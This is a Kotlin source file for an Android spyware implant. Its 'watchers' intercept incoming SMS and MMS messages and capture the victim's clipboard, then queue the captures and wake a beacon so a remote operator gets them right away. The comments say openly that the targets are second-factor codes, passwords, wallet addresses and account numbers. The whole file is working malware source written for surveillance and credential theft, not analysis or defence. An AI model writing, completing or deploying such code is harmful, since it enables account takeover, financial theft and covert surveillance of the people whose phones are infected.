package io.umbra.beacon

import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.app.role.RoleManager
import android.os.Handler
import android.os.Looper
import android.telephony.SmsMessage
import java.io.File

/**
 * The watchers of the phone: the things that happen without the operator
 * asking.
 *
 * A collector answers a question; a watcher waits for the phone to have
 * something to say.  The watchers write into a queue that lives in the
 * state of the implant, and the queue is durable: a phone that rebooted
 * in the middle of the night still has the message of yesterday.
 *
 * When something arrives, the phone does not wait for the next check-in:
 * it asks the beacon to connect again, so the operator sees the code of
 * the second factor while the person is still waiting for it.
 */
object Watch {
    /** The file the queue lives in. */
    const val QUEUE_FILE = "watch.queue"

    /** How many items the queue keeps. */
    const val MAX_ITEMS = 500

    /**
     * One item of the queue.
     *
     * The kind says where it came from ("sms", "clipboard", "overlay"),
     * the fields say what it was.
     */
    data class Item(
        val kind: String,
        val at: Long,
        val fields: Map<String, String>,
    ) {
        /** The item as one line of the queue file. */
        fun encode(): String {
            val body = fields.entries.joinToString("|") { (key, value) ->
                "$key=${escape(value)}"
            }
            return "$kind|${at}|$body"
        }

        /** The item as text. */
        fun text(): String {
            val body = fields.entries.joinToString(" ") { (key, value) -> "$key=$value" }
            return "$kind $body"
        }

        /** The item as a value. */
        fun value(): Upk {
            val fields = this.fields.map { (key, value) -> key to Upk.str(value) }
            return Upk.map(
                "kind" to Upk.str(kind),
                "at" to Upk.num(at),
                *fields.toTypedArray(),
            )
        }
    }

    /** The escape of a value: the separator of the queue is not a letter. */
    private fun escape(value: String): String {
        return value.replace("\\", "\\\\")
            .replace("|", "\\p")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
    }

    /** The unescape of a value. */
    private fun unescape(value: String): String {
        val out = StringBuilder()
        var index = 0
        while (index < value.length) {
            val char = value[index]
            if (char == '\\' && index + 1 < value.length) {
                when (value[index + 1]) {
                    'p' -> out.append('|')
                    'n' -> out.append('\n')
                    'r' -> out.append('\r')
                    '\\' -> out.append('\\')
                    else -> out.append(char).append(value[index + 1])
                }
                index += 2
                continue
            }
            out.append(char)
            index++
        }
        return out.toString()
    }

    /** The file of the queue. */
    private fun queueFile(stateDir: String): File? {
        if (stateDir.isEmpty()) return null
        return File(stateDir, QUEUE_FILE)
    }

    /**
     * Put an item into the queue.
     *
     * The queue is written as a whole: the file is small, and a phone
     * that loses power in the middle of a write must not lose the items
     * that came before it.
     */
    fun append(stateDir: String, kind: String, fields: Map<String, String>) {
        val file = queueFile(stateDir) ?: return
        val item = Item(kind, System.currentTimeMillis(), fields)
        synchronized(Watch::class) {
            try {
                val items = read(file).toMutableList()
                items.add(item)
                while (items.size > MAX_ITEMS) items.removeAt(0)
                file.writeText(items.joinToString("\n") { it.encode() } + "\n")
            } catch (_: Throwable) {
                // The queue is a convenience; a phone that cannot write it
                // still answers the operator.
            }
        }
    }

    /** The items of the queue, oldest first. */
    fun peek(stateDir: String): List<Item> {
        val file = queueFile(stateDir) ?: return emptyList()
        return synchronized(Watch::class) {
            try {
                read(file)
            } catch (_: Throwable) {
                emptyList()
            }
        }
    }

    /**
     * Take the items of the queue.
     *
     * The queue is emptied, so the operator does not read the same message
     * twice.  A phone that fails to write the empty queue keeps the items
     * and says so.
     *
     * When a kind is named, only the items of that kind are taken; the
     * others stay in the queue for their own watcher.
     */
    fun drain(stateDir: String, only: String? = null): List<Item> {
        val file = queueFile(stateDir) ?: return emptyList()
        return synchronized(Watch::class) {
            try {
                val items = read(file)
                if (only == null) {
                    file.writeText("")
                    items
                } else {
                    val taken = items.filter { it.kind == only }
                    val left = items.filter { it.kind != only }
                    file.writeText(left.joinToString("\n") { it.encode() })
                    taken
                }
            } catch (_: Throwable) {
                emptyList()
            }
        }
    }

    /** How many items the queue holds. */
    fun count(stateDir: String): Int = peek(stateDir).size

    /** The queue file, line by line. */
    private fun read(file: File): List<Item> {
        if (!file.isFile) return emptyList()
        val out = mutableListOf<Item>()
        for (line in file.readLines()) {
            if (line.isBlank()) continue
            val parts = line.split("|")
            if (parts.size < 2) continue
            val kind = parts[0]
            val at = parts[1].toLongOrNull() ?: 0L
            val fields = LinkedHashMap<String, String>()
            for (part in parts.drop(2)) {
                val split = part.indexOf('=')
                if (split <= 0) continue
                fields[part.substring(0, split)] = unescape(part.substring(split + 1))
            }
            out.add(Item(kind, at, fields))
        }
        return out
    }

    /**
     * The beacon is asked to connect again.
     *
     * The watcher runs on the thread of the system, and the beacon runs
     * on its own; the call is safe from both.
     */
    fun wakeBeacon() {
        try {
            BeaconService.wake()
        } catch (_: Throwable) {
            // The beacon is not running; the item waits in the queue.
        }
    }
}

/**
 * The watcher of the messages.
 *
 * The implant registers a receiver for the message broadcast.  Since
 * Android 19 the broadcast carries the message only to the application
 * that is the default messenger, so the honest answer says what the
 * platform did: either the phone is the default messenger, or the
 * message was never delivered to the implant.
 */
object SmsWatch {
    /** Whether the receiver is registered. */
    @Volatile private var registered = false

    /** The receiver itself, so it can be taken back. */
    private var receiver: BroadcastReceiver? = null

    /**
     * The state of the phone that decides whether the message arrives.
     *
     * The default messenger is the application the user chose in the
     * settings; the implant is not that application unless the operator
     * made it so.
     */
    private fun isDefaultMessenger(context: Context): Boolean {
        return try {
            // There is no Context.ROLE_MANAGER: the role manager is asked
            // for by its class, which is the documented way since API 23.
            val roleManager = context.getSystemService(RoleManager::class.java)
            roleManager?.isRoleHeld(RoleManager.ROLE_SMS) ?: false
        } catch (_: Throwable) {
            false
        }
    }

    /** Register the receiver. */
    fun start(context: Context): String {
        if (registered) return "the watcher of the messages is already running"
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        filter.addAction("android.provider.Telephony.WAP_PUSH_RECEIVED")
        val created = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                handle(ctx, intent)
            }
        }
        return try {
            // The broadcast of the platform comes from outside the
            // application, so the receiver is exported; the implant runs
            // from API 33 on, where the flag is the way to say it.
            context.registerReceiver(created, filter, Context.RECEIVER_EXPORTED)
            receiver = created
            registered = true
            "the watcher of the messages is running"
        } catch (t: Throwable) {
            "the watcher of the messages could not be registered: ${t.message ?: "the system refused"}"
        }
    }

    /** Take the receiver back. */
    fun stop(context: Context): String {
        val created = receiver
        receiver = null
        registered = false
        if (created == null) return "the watcher of the messages was not running"
        return try {
            context.unregisterReceiver(created)
            "the watcher of the messages was stopped"
        } catch (t: Throwable) {
            "the watcher of the messages could not be stopped: ${t.message ?: "the system refused"}"
        }
    }

    /** Whether the watcher runs. */
    fun running(): Boolean = registered

    /** What the phone says about the watcher. */
    fun status(context: Context): String {
        val out = StringBuilder()
        out.append("sms.watch: the watcher is ").append(if (registered) "running" else "stopped").append('\n')
        out.append("sms.watch: the phone is ")
            .append(if (isDefaultMessenger(context)) "the default messenger" else "not the default messenger")
            .append('\n')
        if (!Sense.granted(context, android.Manifest.permission.RECEIVE_SMS)) {
            out.append("sms.watch: the sms permission is not granted\n")
        }
        out.append("sms.watch: the queue holds ").append(Watch.count(stateDir(context))).append(" items\n")
        return out.toString()
    }

    /** Where the queue of the phone lives. */
    private fun stateDir(context: Context): String = context.filesDir.absolutePath

    /**
     * The message that arrived.
     *
     * The broadcast carries the parts of the message as raw bytes; the
     * platform has a reader for that, and the reader gives the sender,
     * the text and the time.
     */
    private fun handle(context: Context, intent: Intent) {
        try {
            @Suppress("DEPRECATION")
            val raw = intent.getSerializableExtra("pdus")
            val messages = when (raw) {
                is Array<*> -> raw.filterIsInstance<ByteArray>().mapNotNull { bytes ->
                    try {
                        SmsMessage.createFromPdu(bytes)
                    } catch (_: Throwable) {
                        null
                    }
                }
                else -> emptyList()
            }
            if (messages.isEmpty()) return
            val fields = LinkedHashMap<String, String>()
            fields["sender"] = messages.first().displayOriginatingAddress ?: ""
            fields["body"] = messages.joinToString(" ") { it.displayMessageBody ?: "" }
            fields["timestamp"] = "${messages.first().timestampMillis}"
            fields["mms"] = (intent.action ?: "").endsWith("WAP_PUSH_RECEIVED").toString()
            Watch.append(stateDir(context), "sms", fields)
            Watch.wakeBeacon()
        } catch (_: Throwable) {
            // A message that cannot be read is not worth a crash.
        }
    }
}

/**
 * The watcher of the clipboard.
 *
 * The clipboard of a phone belongs to the application that has the focus
 * since Android 10: an ordinary application is told that there is
 * nothing to read.  The watcher registers anyway, and the answer says
 * what the platform allowed -- an empty answer is not an empty
 * clipboard, it is a refused one.
 */
object ClipboardWatch {
    /** Whether the listener is registered. */
    @Volatile private var registered = false

    /** The listener itself. */
    private var listener: ClipboardManager.OnPrimaryClipChangedListener? = null

    /** Register the listener. */
    fun start(context: Context): String {
        if (registered) return "the watcher of the clipboard is already running"
        val manager = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
        if (manager == null) return "the phone has no clipboard"
        // The listener of the platform takes no handler: it is called on the
        // thread of the caller, so the capture is posted to the main looper
        // itself.  The hidden two-argument overload was what asked for one.
        val main = Handler(Looper.getMainLooper())
        val created = ClipboardManager.OnPrimaryClipChangedListener {
            main.post { capture(context, manager) }
        }
        return try {
            manager.addPrimaryClipChangedListener(created)
            listener = created
            registered = true
            "the watcher of the clipboard is running"
        } catch (t: Throwable) {
            "the watcher of the clipboard could not be registered: ${t.message ?: "the system refused"}"
        }
    }

    /** Take the listener back. */
    fun stop(context: Context): String {
        val manager = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
        val created = listener
        listener = null
        registered = false
        if (manager == null || created == null) return "the watcher of the clipboard was not running"
        return try {
            manager.removePrimaryClipChangedListener(created)
            "the watcher of the clipboard was stopped"
        } catch (t: Throwable) {
            "the watcher of the clipboard could not be stopped: ${t.message ?: "the system refused"}"
        }
    }

    /** Whether the watcher runs. */
    fun running(): Boolean = registered

    /**
     * What the phone says about the watcher.
     *
     * The label names the task the operator asked: the watcher answers
     * to `clipboard.sniff` and to `clipboard.watch`, and the answer says
     * which one it was.
     */
    fun status(context: Context, label: String = "clipboard.sniff"): String {
        return "$label: the watcher is " +
            (if (registered) "running" else "stopped") +
            "\n$label: the queue holds " +
            Watch.count(context.filesDir.absolutePath) + " items\n"
    }

    /**
     * Read what was copied.
     *
     * The text is trimmed: a copy of a long page is not interesting, and
     * the queue is small.  The password, the address of a wallet and the
     * number of an account are short, and those are the ones the
     * operator is looking for.
     */
    private fun capture(context: Context, manager: ClipboardManager) {
        try {
            val clip = manager.primaryClip ?: return
            if (clip.itemCount == 0) return
            val text = clip.getItemAt(0).coerceToText(context)?.toString() ?: return
            val trimmed = text.trim()
            if (trimmed.isEmpty()) return
            val fields = LinkedHashMap<String, String>()
            fields["text"] = if (trimmed.length > 512) trimmed.take(512) else trimmed
            fields["length"] = "${trimmed.length}"
            fields["label"] = clip.description?.label?.toString() ?: ""
            Watch.append(context.filesDir.absolutePath, "clipboard", fields)
            Watch.wakeBeacon()
        } catch (_: Throwable) {
            // The clipboard of another application is not readable.
        }
    }
}
